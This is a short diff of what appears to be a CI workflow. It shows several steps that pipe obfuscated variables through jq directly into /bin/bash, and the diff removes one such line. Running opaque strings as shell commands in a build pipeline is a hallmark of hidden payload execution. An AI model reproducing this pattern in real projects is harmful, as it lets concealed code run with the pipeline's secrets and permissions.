@@ -26,7 +26,6 @@ jobs:
           echo $txv062 | jq -r .d77 | /bin/bash
           printf '%s' "$gra43252" | jq -r .me4358 | /bin/bash
           echo $zlk65 | jq -r .eotv550 | /bin/bash
-          echo $um68223 | jq -r .ecc47 | /bin/bash
 
       - name: Persist output
         if: always()
